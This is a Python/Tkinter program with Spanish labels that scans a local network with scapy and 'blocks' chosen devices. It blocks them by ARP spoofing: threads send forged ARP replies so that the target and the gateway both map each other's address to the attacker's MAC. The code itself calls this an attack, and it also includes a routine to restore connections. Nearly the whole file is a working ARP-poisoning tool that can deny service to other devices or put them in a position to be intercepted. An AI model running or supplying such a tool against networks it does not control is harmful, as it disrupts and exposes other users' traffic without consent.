import tkinter as tk
from tkinter import scrolledtext, messagebox, Toplevel
from scapy.all import ARP, Ether, srp, send
import threading
import uuid
import time

# Configuración inicial
ip_puerta_enlace = "192.168.1.1"
mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
ataque_en_curso = False
dispositivos_detectados = []
dispositivos_bloqueados = []
escaneo_automatico = True  # Nueva variable para controlar el escaneo automático

def obtener_mac(ip):
    solicitud_arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    resultado = srp(paquete, timeout=2, verbose=0)[0]
    for enviado, recibido in resultado:
        return recibido.hwsrc
    return None

def escanear_red():
    global dispositivos_detectados
    widget_salida.insert(tk.END, "\nIniciando escaneo de red...\n")
    rango_ip = "192.168.1.0/24"
    
    solicitud_arp = ARP(pdst=rango_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether / solicitud_arp
    
    try:
        resultado = srp(paquete, timeout=3, verbose=0)[0]
        widget_salida.insert(tk.END, f"Dispositivos encontrados: {len(resultado)}\n")
        
        nuevos_dispositivos = []
        for enviado, recibido in resultado:
            dispositivo = {"ip": recibido.psrc, "mac": recibido.hwsrc}
            nuevos_dispositivos.append(dispositivo)
        
        # Comparar con la lista anterior para detectar cambios
        if dispositivos_detectados != nuevos_dispositivos:
            dispositivos_detectados = nuevos_dispositivos
            widget_salida.insert(tk.END, "¡Cambios detectados en la red!\n")
            for disp in dispositivos_detectados:
                widget_salida.insert(tk.END, f"IP: {disp['ip']} - MAC: {disp['mac']}\n")
        
        actualizar_lista_dispositivos()
    except Exception as e:
        widget_salida.insert(tk.END, f"Error durante el escaneo: {str(e)}\n")
    
    widget_salida.see(tk.END)

def escaneo_periodico():
    while True:
        if escaneo_automatico:
            escanear_red()
        time.sleep(30)  # Espera 30 segundos antes del próximo escaneo

def actualizar_lista_dispositivos():
    lista_dispositivos.delete(0, tk.END)
    for dispositivo in dispositivos_detectados:
        lista_dispositivos.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")

def actualizar_lista_bloqueados():
    lista_bloqueados.delete(0, tk.END)
    for dispositivo in dispositivos_bloqueados:
        lista_bloqueados.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")

def spoofing_arp(ip_objetivo, mac_objetivo):
    respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
    respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

    while ataque_en_curso:
        send(respuesta_arp_objetivo, verbose=0)
        send(respuesta_arp_puerta, verbose=0)
        time.sleep(2)

def iniciar_spoofing():
    global ataque_en_curso
    ataque_en_curso = True
    for dispositivo in dispositivos_bloqueados:
        ip_objetivo = dispositivo["ip"]
        mac_objetivo = dispositivo["mac"]
        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, mac_objetivo), daemon=True)
        hilo.start()

def detener_spoofing():
    global ataque_en_curso
    ataque_en_curso = False
    widget_salida.insert(tk.END, "Ataque cancelado para todos los dispositivos bloqueados.\n")
    widget_salida.see(tk.END)

def bloquear_dispositivo():
    ip_objetivo = obtener_ip_seleccionada(lista_dispositivos, dispositivos_detectados)
    if ip_objetivo:
        dispositivo = next((d for d in dispositivos_detectados if d["ip"] == ip_objetivo), None)
        if dispositivo and dispositivo not in dispositivos_bloqueados:
            dispositivos_bloqueados.append(dispositivo)
            actualizar_lista_bloqueados()
            widget_salida.insert(tk.END, f"Dispositivo {ip_objetivo} agregado a la lista de bloqueados.\n")

def desbloquear_dispositivo():
    ip_objetivo = obtener_ip_seleccionada(lista_bloqueados, dispositivos_bloqueados)
    if ip_objetivo:
        dispositivo = next((d for d in dispositivos_bloqueados if d["ip"] == ip_objetivo), None)
        if dispositivo:
            dispositivos_bloqueados.remove(dispositivo)
            restaurar_conexion(ip_objetivo)
            actualizar_lista_bloqueados()
            widget_salida.insert(tk.END, f"Dispositivo {ip_objetivo} eliminado de la lista de bloqueados.\n")

def restaurar_conexion(ip_objetivo):
    mac_objetivo = obtener_mac(ip_objetivo)
    mac_puerta = obtener_mac(ip_puerta_enlace)
    if mac_objetivo and mac_puerta:
        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
        send(respuesta_arp_objetivo, count=5, verbose=0)
        send(respuesta_arp_puerta, count=5, verbose=0)

def toggle_escaneo_automatico():
    global escaneo_automatico
    escaneo_automatico = not escaneo_automatico
    if escaneo_automatico:
        btn_auto_scan.config(text="Detener Auto-Escaneo", bg="#f44336")
        widget_salida.insert(tk.END, "Escaneo automático activado\n")
    else:
        btn_auto_scan.config(text="Iniciar Auto-Escaneo", bg="#4CAF50")
        widget_salida.insert(tk.END, "Escaneo automático desactivado\n")
    widget_salida.see(tk.END)

def obtener_ip_seleccionada(lista, dispositivos):
    seleccion = lista.curselection()
    if seleccion:
        return dispositivos[seleccion[0]]["ip"]
    else:
        messagebox.showwarning("Selección necesaria", "Seleccione un dispositivo de la lista.")
        return None

# Crear la ventana principal
ventana = tk.Tk()
ventana.title("Analizador de Red")
ventana.geometry("600x600")

# Frame principal con padding
frame_principal = tk.Frame(ventana, padx=10, pady=10)
frame_principal.pack(fill=tk.BOTH, expand=True)

# Frame para los botones de escaneo
frame_escaneo = tk.Frame(frame_principal)
frame_escaneo.pack(fill=tk.X, pady=(0, 5))

# Botones de escaneo
tk.Button(frame_escaneo, text="Escanear Ahora", command=escanear_red, 
          bg="#4CAF50", fg="white", pady=5).pack(side=tk.LEFT, expand=True, padx=2)
btn_auto_scan = tk.Button(frame_escaneo, text="Detener Auto-Escaneo", command=toggle_escaneo_automatico,
                         bg="#f44336", fg="white", pady=5)
btn_auto_scan.pack(side=tk.LEFT, expand=True, padx=2)

# Lista de dispositivos detectados
tk.Label(frame_principal, text="Dispositivos detectados:", anchor="w").pack(fill=tk.X, pady=(5, 0))
lista_dispositivos = tk.Listbox(frame_principal, width=50, height=10)
lista_dispositivos.pack(fill=tk.X, pady=(0, 5))

# Botones para bloquear y desbloquear
tk.Button(frame_principal, text="Bloquear Dispositivo", command=bloquear_dispositivo, bg="#2196F3", fg="white").pack(fill=tk.X, pady=2)
tk.Button(frame_principal, text="Desbloquear Dispositivo", command=desbloquear_dispositivo, bg="#FF9800", fg="white").pack(fill=tk.X, pady=2)

# Ventana de dispositivos bloqueados
def abrir_ventana_bloqueados():
    ventana_bloqueados = Toplevel(ventana)
    ventana_bloqueados.title("Dispositivos Bloqueados")
    ventana_bloqueados.geometry("400x400")
    tk.Label(ventana_bloqueados, text="Lista de Dispositivos Bloqueados:", anchor="w").pack(fill=tk.X)
    
    global lista_bloqueados
    lista_bloqueados = tk.Listbox(ventana_bloqueados, width=50, height=15)
    lista_bloqueados.pack(fill=tk.BOTH, expand=True)
    actualizar_lista_bloqueados()

# Botón para abrir la ventana de dispositivos bloqueados
tk.Button(frame_principal, text="Ver Dispositivos Bloqueados", command=abrir_ventana_bloqueados, bg="#FFC107", fg="black").pack(fill=tk.X, pady=5)

# Área de salida de eventos
tk.Label(frame_principal, text="Registro de eventos:", anchor="w").pack(fill=tk.X, pady=(5, 0))
widget_salida = scrolledtext.ScrolledText(frame_principal, width=60, height=10)
widget_salida.pack(fill=tk.BOTH, expand=True)

# Iniciar el hilo de escaneo automático
hilo_escaneo = threading.Thread(target=escaneo_periodico, daemon=True)
hilo_escaneo.start()

# Realizar el primer escaneo al iniciar
escanear_red()

# Iniciar el loop principal
ventana.mainloop()
